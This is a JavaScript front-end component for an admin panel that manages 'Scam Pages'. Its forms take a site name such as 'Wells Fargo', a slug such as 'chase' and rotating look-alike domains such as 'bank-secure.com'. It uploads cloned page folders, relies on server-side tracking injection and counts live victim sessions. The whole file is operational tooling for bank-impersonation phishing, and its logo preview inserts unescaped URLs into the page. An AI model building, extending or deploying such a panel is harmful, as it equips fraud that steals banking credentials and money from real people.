/**
 * ALP - Settings Website Management Component
 * Encapsulates all Website Management UI rendering, modals, and event delegations.
 */
const SettingsWebsites = (() => {
  let websites = [];

  function setWebsites(w) {
    websites = w || [];
  }

  function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
  }

  function getInitialsColor(name) {
    const cols = ['#6366f1','#10b981','#f59e0b','#ef4444','#3b82f6','#8b5cf6','#ec4899','#14b8a6'];
    let h = 0; const s = String(name || '');
    for (let i = 0; i < s.length; i++) h = s.charCodeAt(i) + ((h << 5) - h);
    return cols[Math.abs(h) % cols.length];
  }

  // Renders the premium website card grid
  function parseAltDomains(raw) {
    if (!raw) return [];
    try {
      const a = JSON.parse(raw);
      return Array.isArray(a) ? a : [];
    } catch {
      // Legacy plain-string format
      return [{ domain: raw, active: 0 }];
    }
  }

  function renderWebsitesList(listEl, emptyEl) {
    if (!listEl) return;

    if (websites.length === 0) {
      listEl.innerHTML = '';
      if (emptyEl) emptyEl.style.display = 'none';
      listEl.innerHTML = `
        <div class="website-empty-cta" id="website-empty-cta-card">
          <svg class="website-empty-icon" width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2">
            <circle cx="12" cy="12" r="10"/>
            <line x1="2" y1="12" x2="22" y2="12"/>
            <path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
          </svg>
          <h3>No websites yet</h3>
          <p>Add your first website to start tracking visitors and managing pages.</p>
          <button class="website-empty-cta-btn" id="website-empty-add-btn">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
            Add Scam Page
          </button>
        </div>
      `;
      // Wire empty state add button to the real add button
      const emptyBtn = document.getElementById('website-empty-add-btn');
      const realBtn = document.getElementById('add-website-btn');
      if (emptyBtn && realBtn) emptyBtn.addEventListener('click', () => realBtn.click());
      return;
    }
    if (emptyEl) emptyEl.style.display = 'none';

    listEl.innerHTML = websites.map((w, idx) => {
      const initial = (w.name || '?')[0].toUpperCase();
      const initColor = w.color || getInitialsColor(w.name || w.id);
      // Parse RGB from hex for CSS vars
      const hex = initColor.replace('#', '');
      const r = parseInt(hex.substring(0,2), 16);
      const g = parseInt(hex.substring(2,4), 16);
      const b = parseInt(hex.substring(4,6), 16);

      const logoHtml = w.logo_url
        ? `<img src="${escapeHtml(w.logo_url)}" alt="${escapeHtml(w.name)}" onerror="this.outerHTML='<div class=&quot;website-logo-avatar&quot; style=&quot;background:${initColor};&quot;>${escapeHtml(initial)}</div>'" style="background:transparent;" />`
        : `<div class="website-logo-avatar" style="background:${initColor};">${escapeHtml(initial)}</div>`;

      const activeSessions = w.active_sessions || 0;
      const totalSessions = w.total_sessions || 0;
      const animDelay = `animation-delay:${Math.min(idx * 0.07, 0.5)}s;`;

      return `
        <div class="website-card" data-website-id="${w.id}" style="--wc-r:${r};--wc-g:${g};--wc-b:${b};${animDelay}">
          <div class="website-card-accent"></div>
          <div class="website-status-dot ${w.is_active ? 'active' : 'inactive'}" title="${w.is_active ? 'Active' : 'Inactive'}"></div>

          <div class="website-card-inner">
            <!-- Identity row -->
            <div class="website-card-identity">
              <div class="website-logo-wrap">${logoHtml}</div>
              <div class="website-info">
                <div class="website-name" title="${escapeHtml(w.name)}">${escapeHtml(w.name)}</div>
                <div class="website-domain" title="${escapeHtml(w.domain)}">${(w.domain_active === 0) ? '🔴' : '🟢'} ${escapeHtml(w.domain)}</div>
                ${parseAltDomains(w.domain_alt).map(a => `
                  <div class="website-domain" title="${escapeHtml(a.domain)}" style="font-size:10px;opacity:0.75;">
                    ${a.active ? '🟢' : '🔴'} ${escapeHtml(a.domain)}
                  </div>`).join('')}
                ${w.demo_slug ? `
                  <a href="/demo/${escapeHtml(w.demo_slug)}" target="_blank" class="website-slug-badge" title="Open demo page">
                    <svg width="8" height="8" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
                    /demo/${escapeHtml(w.demo_slug)}
                  </a>` : ''}
              </div>
            </div>

            <!-- Stats bar -->
            <div class="website-stats-bar">
              <div class="website-stat-item">
                <div class="website-stat-value active-count">${activeSessions}</div>
                <div class="website-stat-label">🟢 Live</div>
              </div>
              <div class="website-stat-item">
                <div class="website-stat-value">${totalSessions}</div>
                <div class="website-stat-label">Total Sessions</div>
              </div>
              <div class="website-stat-item">
                <div class="website-stat-value">${w.page_views_today || 0}</div>
                <div class="website-stat-label">Views Today</div>
              </div>
            </div>

            <!-- API Key row -->
            <div class="website-apikey-row">
              <div class="website-key-label">API Key</div>
              <div class="website-apikey-pill">
                <span class="key-text" id="key-text-${w.id}" data-key="${escapeHtml(w.api_key)}" data-shown="0">
                  ${escapeHtml(w.api_key.slice(0,4))}••••••••••••••••${escapeHtml(w.api_key.slice(-4))}
                </span>
                <span class="key-actions">
                  <button class="website-key-btn website-key-toggle-btn" data-id="${w.id}" title="Show/Hide key">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                  </button>
                  <button class="website-key-btn" onclick="window.copyToClipboard('${escapeHtml(w.api_key)}','API key copied!')" title="Copy key">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  </button>
                </span>
              </div>
            </div>

            <!-- Active toggle row -->
            <div style="display:flex;align-items:center;gap:10px;">
              <label class="toggle-switch" style="margin:0;">
                <input type="checkbox" class="toggle-cb website-active-toggle" data-id="${w.id}" ${w.is_active ? 'checked' : ''} />
                <span class="toggle-slider"></span>
              </label>
              <span class="website-status-text ${w.is_active ? 'active' : ''}">
                ${w.is_active ? 'Active — tracking visitors' : 'Inactive — tracking paused'}
              </span>
            </div>
          </div>

          <!-- Action row -->
          <div class="website-action-row">
            <button class="website-action-btn code-btn website-snippet-btn"
              data-id="${w.id}" data-name="${escapeHtml(w.name)}" data-key="${escapeHtml(w.api_key)}"
              title="Get tracking code">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
              Code
            </button>
            <button class="website-action-btn edit-btn website-edit-btn" data-id="${w.id}" title="Edit website">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
              Edit
            </button>
            <button class="website-action-btn delete-btn website-delete-btn" data-id="${w.id}" title="Delete website">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a1 1 0 011-1h4a1 1 0 011 1v2"/></svg>
              Delete
            </button>
          </div>
        </div>
      `;
    }).join('');
  }

  // Opens a beautiful modern modal showing the tracking script tag
  function showTrackingCodeModal(websiteName, apiKey) {
    const scriptUrl = `${window.location.origin}/tracker.js`;
    const snippet = `<script src="${scriptUrl}" data-api-key="${apiKey}"></script>`;
    window.showModal({
      title: `🌐 Tracking Code — ${escapeHtml(websiteName)}`,
      width: '560px',
      content: `
        <div style="display:flex;flex-direction:column;gap:14px;font-family:'Inter',sans-serif;">
          <p style="color:var(--text-secondary);font-size:13px;line-height:1.5;margin:0;">
            Paste this tracking code at the end of the <code>&lt;head&gt;</code> or <code>&lt;body&gt;</code> tag of your HTML pages.
          </p>
          <div style="position:relative;">
            <pre style="
              margin:0;padding:14px 16px;background:rgba(0,0,0,0.3);border:1px solid var(--border-primary);
              border-radius:10px;font-family:var(--font-mono);font-size:12px;color:#a5b4fc;
              overflow-x:auto;white-space:pre-wrap;word-break:break-all;
            " id="modal-snippet-text">${escapeHtml(snippet)}</pre>
            <button class="btn btn-sm btn-secondary" onclick="window.copyToClipboard(document.getElementById('modal-snippet-text').textContent,'Snippet copied!');" style="
              position:absolute;top:8px;right:8px;height:28px;padding:0 12px;font-size:11px;
            ">Copy</button>
          </div>
          <div style="background:rgba(99,102,241,0.06);border:1px solid rgba(99,102,241,0.12);border-radius:10px;padding:12px 14px;">
            <h4 style="color:#a5b4fc;font-size:12px;font-weight:600;margin:0 0 6px 0;text-transform:uppercase;letter-spacing:0.5px;">Auto-injection for Demo Pages</h4>
            <p style="color:var(--text-secondary);font-size:11px;line-height:1.4;margin:0;">
              Note: For <strong>Scam Pages</strong> uploaded to this panel, the tracking code is <strong>automatically injected</strong> by the server. You do not need to embed this script manually!
            </p>
          </div>
        </div>
      `,
      confirmText: 'Done',
      hideCancel: true
    });
  }

  function init(loadWebsitesCallback) {
    // Add Scam Page button
    const addWebsite = document.getElementById('add-website-btn');
    if (addWebsite) {
      addWebsite.addEventListener('click', () => {
        const detectedHost = window.location.hostname || 'localhost';
        let pendingFolderFiles = [];
        window.showModal({
          title: '🎯 Add Scam Page',
          content: `
            <div class="dp-modal-form">
              <div class="form-group"><label>Site Name <span style="color:#ef4444;font-size:12px;">*</span></label><input type="text" id="modal-website-name" class="form-input" placeholder="Wells Fargo" /></div>
              <div class="form-group">
                <label>Logo URL <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">optional — paste URL or upload</span></label>
                <div style="display:flex;gap:8px;align-items:center;">
                  <input type="url" id="modal-website-logo" class="form-input" placeholder="https://cdn.example.com/logo.png" style="flex:1;" />
                  <input type="file" id="modal-website-logo-file" accept="image/*" style="display:none;" />
                  <button type="button" class="btn btn-sm btn-outline" id="modal-website-logo-upload-btn" title="Upload Image" style="padding:0;width:38px;height:38px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                  </button>
                  <div id="modal-logo-preview" style="width:38px;height:38px;border-radius:8px;border:1px solid var(--border-color);background:rgba(255,255,255,0.04);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--text-tertiary);flex-shrink:0;overflow:hidden;">?</div>
                </div>
              </div>
              <div class="form-group">
                <label>Domain <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">↙ auto-detected</span></label>
                <input type="text" id="modal-website-domain" class="form-input" value="${detectedHost}" placeholder="localhost" />
              </div>
              <div class="form-group"><label>Slug <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">(e.g. 'chase' → /demo/chase/)</span></label><input type="text" id="modal-website-slug" class="form-input" placeholder="chase" /></div>
              <div class="form-group">
                <label>Glow Color <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">(card custom color glow on hover)</span></label>
                <div style="display:flex;gap:10px;align-items:center;">
                  <input type="color" id="modal-website-color" value="#6366f1" style="width:48px;height:38px;padding:2px;background:none;border:1px solid var(--border-color);border-radius:6px;cursor:pointer;flex-shrink:0;" />
                  <input type="text" id="modal-website-color-hex" class="form-input" placeholder="#6366f1" value="#6366f1" style="flex:1;" />
                </div>
              </div>
              <div style="border:1px solid rgba(99,102,241,0.18);border-radius:12px;padding:12px 14px;background:rgba(99,102,241,0.05);">
                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
                  <div>
                    <div style="font-size:12px;font-weight:700;color:#a5b4fc;">📁 Upload Scam Page Folder</div>
                    <div style="font-size:11px;color:var(--text-muted);margin-top:2px;">All files in the folder will be uploaded (HTML, CSS, images, etc.) — optional</div>
                  </div>
                  <button type="button" id="modal-folder-btn" class="btn btn-sm btn-outline" style="display:flex;align-items:center;gap:5px;padding:6px 12px;border-color:rgba(99,102,241,0.3);color:#a5b4fc;font-size:11px;">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
                    Choose Folder
                  </button>
                </div>
                <input type="file" id="modal-folder-input" webkitdirectory multiple style="display:none;" />
                <div id="modal-folder-preview" style="font-size:11px;color:var(--text-muted);font-style:italic;">No folder selected</div>
              </div>
            </div>
          `,
          confirmText: 'Create Scam Page',
          onConfirm: async () => {
            const name = document.getElementById('modal-website-name').value.trim();
            const domain = document.getElementById('modal-website-domain').value.trim();
            const demo_slug = document.getElementById('modal-website-slug').value.trim();
            const logo_url = document.getElementById('modal-website-logo').value.trim();
            const color = document.getElementById('modal-website-color-hex').value.trim();
            if (!name || !domain) { window.showToast('Name and domain required', 'warning'); return; }
            try {
              const result = await window.ALPApi.createWebsite({ name, domain, demo_slug: demo_slug || null, logo_url: logo_url || null, color: color || '#6366f1' });
              const newId = result.website && result.website.id;
              window.showToast(`Scam Page "${name}" created!`, 'success');
              if (pendingFolderFiles.length > 0 && newId && demo_slug) {
                try {
                  window.showToast(`Uploading ${pendingFolderFiles.length} file(s)...`, 'info');
                  await window.ALPApi.uploadDemoFiles(newId, pendingFolderFiles);
                  window.showToast('Files uploaded!', 'success');
                } catch (uploadErr) {
                  window.showToast('Created but upload failed: ' + uploadErr.message, 'warning');
                }
              }
              await loadWebsitesCallback();
            } catch (e) { window.showToast('Failed: ' + e.message, 'error'); }
          }
        });
        // Wire interactivity after modal renders
        setTimeout(() => {
          const colorInput = document.getElementById('modal-website-color');
          const colorHexInput = document.getElementById('modal-website-color-hex');
          if (colorInput && colorHexInput) {
            colorInput.addEventListener('input', () => {
              colorHexInput.value = colorInput.value;
            });
            colorHexInput.addEventListener('input', () => {
              const val = colorHexInput.value.trim();
              if (/^#[0-9A-F]{6}$/i.test(val)) {
                colorInput.value = val;
              }
            });
          }

          const logoInput = document.getElementById('modal-website-logo');
          const preview = document.getElementById('modal-logo-preview');
          if (logoInput && preview) {
            const updatePreview = () => {
              const url = logoInput.value.trim();
              preview.innerHTML = url ? `<img src="${url}" style="width:100%;height:100%;object-fit:contain;" onerror="this.parentElement.innerHTML='❌'">` : '?';
            };
            logoInput.addEventListener('input', updatePreview);
          }
          const fileInput = document.getElementById('modal-website-logo-file');
          const uploadBtn = document.getElementById('modal-website-logo-upload-btn');
          if (uploadBtn && fileInput && logoInput) {
            uploadBtn.addEventListener('click', () => fileInput.click());
            fileInput.addEventListener('change', async (e) => {
              const file = e.target.files[0];
              if (!file) return;
              try {
                uploadBtn.disabled = true; uploadBtn.innerHTML = '...';
                const res = await window.ALPApi.uploadLogo(file);
                logoInput.value = res.url; logoInput.dispatchEvent(new Event('input'));
                window.showToast('Logo uploaded', 'success');
              } catch (err) { window.showToast('Upload failed: ' + err.message, 'error');
              } finally {
                uploadBtn.disabled = false;
                uploadBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>';
                fileInput.value = '';
              }
            });
          }
          // Folder picker
          const folderBtn = document.getElementById('modal-folder-btn');
          const folderInput = document.getElementById('modal-folder-input');
          const folderPreview = document.getElementById('modal-folder-preview');
          if (folderBtn && folderInput && folderPreview) {
            folderBtn.addEventListener('click', () => folderInput.click());
            folderInput.addEventListener('change', () => {
              const all = Array.from(folderInput.files);
              pendingFolderFiles = all;
              const htmlFiles = all.filter(f => f.name.toLowerCase().endsWith('.html'));
              if (htmlFiles.length === 0) {
                folderPreview.innerHTML = '<span style="color:#f59e0b;">No .html files found in folder</span>';
              } else {
                folderPreview.innerHTML = `<span style="color:#10b981;font-weight:600;">✓ ${htmlFiles.length} HTML file(s) ready</span>`;
              }
            });
          }
        }, 60);
      });
    }

    // Website list delegation
    const websitesList = document.getElementById('websites-list');
    if (websitesList) {
      websitesList.addEventListener('click', async (e) => {
        // API Key eye-toggle
        const keyToggleBtn = e.target.closest('.website-key-toggle-btn');
        if (keyToggleBtn) {
          e.stopPropagation();
          const id = keyToggleBtn.dataset.id;
          const keyText = document.getElementById(`key-text-${id}`);
          if (!keyText) return;
          const shown = keyText.dataset.shown === '1';
          if (shown) {
            const key = keyText.dataset.key;
            keyText.textContent = `${key.slice(0,4)}••••••••••••••••${key.slice(-4)}`;
            keyText.dataset.shown = '0';
          } else {
            keyText.textContent = keyText.dataset.key;
            keyText.dataset.shown = '1';
          }
          return;
        }

        // Snippet button
        const snippetBtn = e.target.closest('.website-snippet-btn');
        if (snippetBtn) {
          showTrackingCodeModal(snippetBtn.dataset.name, snippetBtn.dataset.key);
          return;
        }

        // Edit button
        const editBtn = e.target.closest('.website-edit-btn');
        if (editBtn) {
          const w = websites.find(x => String(x.id) === editBtn.dataset.id);
          if (!w) return;
          window.showModal({
            title: '✏️ Edit Website',
            content: `
              <div class="dp-modal-form">
                <div class="form-group"><label>Website Name</label><input type="text" id="modal-website-name" class="form-input" value="${escapeHtml(w.name)}" /></div>
                <div class="form-group">
                  <label>Logo URL <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">optional — paste image URL</span></label>
                  <div style="display:flex;gap:8px;align-items:center;">
                    <input type="url" id="modal-website-logo" class="form-input" value="${escapeHtml((w.logo_url && w.logo_url !== 'null' && w.logo_url !== 'undefined') ? w.logo_url : '')}" placeholder="https://cdn.example.com/logo.png" style="flex:1;" />
                    <input type="file" id="modal-website-logo-file" accept="image/*" style="display:none;" />
                    <button type="button" class="btn btn-sm btn-outline" id="modal-website-logo-upload-btn" title="Upload Image" style="padding:0;width:38px;height:38px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    </button>
                    <div id="modal-logo-preview" style="width:38px;height:38px;border-radius:8px;border:1px solid var(--border-color);overflow:hidden;display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--text-tertiary);flex-shrink:0;background:rgba(255,255,255,0.04);">
                      ${(w.logo_url && w.logo_url !== 'null' && w.logo_url !== 'undefined') ? `<img src="${escapeHtml(w.logo_url)}" style="width:100%;height:100%;object-fit:contain;" onerror="this.parentElement.innerHTML='❌'">` : '?'}
                    </div>
                  </div>
                </div>
                <div class="form-group">
                  <label>Primary Domain</label>
                  <div style="display:flex;gap:8px;align-items:center;">
                    <input type="text" id="modal-website-domain" class="form-input" value="${escapeHtml(w.domain)}" style="flex:1;" />
                    <label class="toggle-switch" style="margin:0;flex-shrink:0;" title="Enable/disable primary domain routing">
                      <input type="checkbox" id="modal-website-domain-active" ${w.domain_active === 0 ? '' : 'checked'} />
                      <span class="toggle-slider"></span>
                    </label>
                  </div>
                </div>
                <div class="form-group"><label>Demo Slug <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">(optional, e.g. 'bank')</span></label><input type="text" id="modal-website-slug" class="form-input" value="${escapeHtml(w.demo_slug || '')}" placeholder="slug" /></div>
                <div style="border:1px solid rgba(99,102,241,0.18);border-radius:12px;padding:12px 14px;background:rgba(99,102,241,0.05);">
                  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
                    <div style="font-size:12px;font-weight:700;color:#a5b4fc;">🔗 Alternate Domains</div>
                    <button type="button" id="modal-add-alt-domain" class="btn btn-sm btn-outline" style="font-size:11px;padding:4px 10px;border-color:rgba(99,102,241,0.3);color:#a5b4fc;">+ Add Domain</button>
                  </div>
                  <div id="modal-alt-domains-list" style="display:flex;flex-direction:column;gap:8px;"></div>
                </div>
                <div class="form-group">
                  <label>Glow Color <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">(card custom color glow on hover)</span></label>
                  <div style="display:flex;gap:10px;align-items:center;">
                    <input type="color" id="modal-website-color" value="${escapeHtml(w.color || '#6366f1')}" style="width:48px;height:38px;padding:2px;background:none;border:1px solid var(--border-color);border-radius:6px;cursor:pointer;flex-shrink:0;" />
                    <input type="text" id="modal-website-color-hex" class="form-input" placeholder="#6366f1" value="${escapeHtml(w.color || '#6366f1')}" style="flex:1;" />
                  </div>
                </div>
              </div>
            `,
            onConfirm: async () => {
              const color = document.getElementById('modal-website-color-hex').value.trim();
              const altRows = document.querySelectorAll('#modal-alt-domains-list .alt-domain-row');
              const domain_alt = Array.from(altRows).map(row => ({
                domain: row.querySelector('.alt-domain-input').value.trim(),
                active: row.querySelector('.alt-domain-toggle').checked ? 1 : 0
              })).filter(a => a.domain);
              try {
                await window.ALPApi.updateWebsite(w.id, {
                  name: document.getElementById('modal-website-name').value.trim(),
                  logo_url: document.getElementById('modal-website-logo').value.trim() || null,
                  domain: document.getElementById('modal-website-domain').value.trim(),
                  domain_active: document.getElementById('modal-website-domain-active').checked ? 1 : 0,
                  demo_slug: document.getElementById('modal-website-slug').value.trim() || null,
                  color: color || '#6366f1',
                  domain_alt
                });
                window.showToast('Website updated', 'success');
                await loadWebsitesCallback();
              } catch (err) { window.showToast('Failed: ' + err.message, 'error'); }
            }
          });
          // Wire logo preview after modal renders
          setTimeout(() => {
            // ── Alternate domains ──────────────────────────────────────────

            const altList = document.getElementById('modal-alt-domains-list');
            const addAltBtn = document.getElementById('modal-add-alt-domain');

            function renderAltRow(domain = '', active = 0) {
              const row = document.createElement('div');
              row.className = 'alt-domain-row';
              row.style.cssText = 'display:flex;align-items:center;gap:8px;';
              row.innerHTML = `
                <input type="text" class="form-input alt-domain-input" value="${escapeHtml(domain)}" placeholder="e.g. bank-secure.com" style="flex:1;font-size:12px;" />
                <label class="toggle-switch" style="margin:0;flex-shrink:0;">
                  <input type="checkbox" class="alt-domain-toggle" ${active ? 'checked' : ''} />
                  <span class="toggle-slider"></span>
                </label>
                <button type="button" class="btn btn-sm alt-domain-remove" style="padding:0;width:28px;height:28px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:6px;color:#f87171;">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                </button>`;
              row.querySelector('.alt-domain-remove').addEventListener('click', () => {
                const domName = row.querySelector('.alt-domain-input').value.trim() || 'this domain';
                if (confirm(`Remove "${domName}" from alternate domains?`)) row.remove();
              });
              altList.appendChild(row);
            }

            parseAltDomains(w.domain_alt).forEach(a => renderAltRow(a.domain, a.active));
            if (addAltBtn) addAltBtn.addEventListener('click', () => {
              const domVal = prompt('Enter the alternate domain (e.g. bank-secure.com):');
              if (domVal && domVal.trim()) renderAltRow(domVal.trim(), 0);
            });

            // Mutual exclusion: activating one domain deactivates all others
            const primaryToggle = document.getElementById('modal-website-domain-active');
            function onDomainToggle(source) {
              if (source === 'primary' && primaryToggle.checked) {
                altList.querySelectorAll('.alt-domain-toggle').forEach(t => { t.checked = false; });
              } else if (source === 'alt') {
                const anyAltOn = Array.from(altList.querySelectorAll('.alt-domain-toggle')).some(t => t.checked);
                if (anyAltOn && primaryToggle) primaryToggle.checked = false;
                // Only keep the last-toggled alt on
                const allAlts = altList.querySelectorAll('.alt-domain-toggle');
                allAlts.forEach(t => {
                  if (t !== document.activeElement && t !== source) t.checked = false;
                });
              }
            }
            if (primaryToggle) primaryToggle.addEventListener('change', () => onDomainToggle('primary'));
            altList.addEventListener('change', (e) => {
              if (e.target.classList.contains('alt-domain-toggle') && e.target.checked) {
                const allAlts = altList.querySelectorAll('.alt-domain-toggle');
                allAlts.forEach(t => { if (t !== e.target) t.checked = false; });
                if (primaryToggle) primaryToggle.checked = false;
              }
            });
            // ── End alternate domains ──────────────────────────────────────

            const colorInput = document.getElementById('modal-website-color');
            const colorHexInput = document.getElementById('modal-website-color-hex');
            if (colorInput && colorHexInput) {
              colorInput.addEventListener('input', () => {
                colorHexInput.value = colorInput.value;
              });
              colorHexInput.addEventListener('input', () => {
                const val = colorHexInput.value.trim();
                if (/^#[0-9A-F]{6}$/i.test(val)) {
                  colorInput.value = val;
                }
              });
            }

            const logoInput = document.getElementById('modal-website-logo');
            const preview = document.getElementById('modal-logo-preview');
            if (logoInput && preview) {
              const updatePreview = () => {
                const url = logoInput.value.trim();
                if (url) {
                  preview.innerHTML = `<img src="${url}" style="width:100%;height:100%;object-fit:contain;" onerror="this.parentElement.innerHTML='❌'">`;
                } else {
                  preview.innerHTML = '?';
                }
              };
              logoInput.addEventListener('input', updatePreview);
              logoInput.addEventListener('blur', updatePreview);
            }
            
            const fileInput = document.getElementById('modal-website-logo-file');
            const uploadBtn = document.getElementById('modal-website-logo-upload-btn');
            if (uploadBtn && fileInput && logoInput) {
              uploadBtn.addEventListener('click', () => fileInput.click());
              fileInput.addEventListener('change', async (e) => {
                const file = e.target.files[0];
                if (!file) return;
                try {
                  uploadBtn.disabled = true;
                  uploadBtn.innerHTML = '...';
                  const res = await window.ALPApi.uploadLogo(file);
                  if (res && res.logo_url) {
                    logoInput.value = res.logo_url;
                    logoInput.dispatchEvent(new Event('input'));
                    window.showToast('Logo uploaded successfully!', 'success');
                  }
                } catch (err) {
                  window.showToast('Upload failed: ' + err.message, 'error');
                } finally {
                  uploadBtn.disabled = false;
                  uploadBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>';
                  fileInput.value = '';
                }
              });
            }
          }, 60);
          return;
        }

        // Delete button
        const deleteBtn = e.target.closest('.website-delete-btn');
        if (deleteBtn) {
          window.showModal({
            title: 'Delete Website',
            content: '<p style="color:var(--text-secondary);">Are you sure? All sessions and data for this website will be lost.</p>',
            onConfirm: async () => {
              try {
                await window.ALPApi.deleteWebsite(deleteBtn.dataset.id);
                window.showToast('Website deleted', 'success');
                await loadWebsitesCallback();
              } catch (err) { window.showToast('Failed', 'error'); }
            }
          });
          return;
        }
      });

      // Toggle switch change handler
      websitesList.addEventListener('change', async (e) => {
        const toggle = e.target.closest('.website-active-toggle');
        if (toggle) {
          try {
            await window.ALPApi.updateWebsite(toggle.dataset.id, { is_active: toggle.checked ? 1 : 0 });
            window.showToast(toggle.checked ? 'Website activated' : 'Website deactivated', 'success');
            await loadWebsitesCallback();
          } catch (err) { window.showToast('Failed', 'error'); }
        }
      });
    }
  }

  return { setWebsites, renderWebsitesList, init };
})();

window.SettingsWebsites = SettingsWebsites;
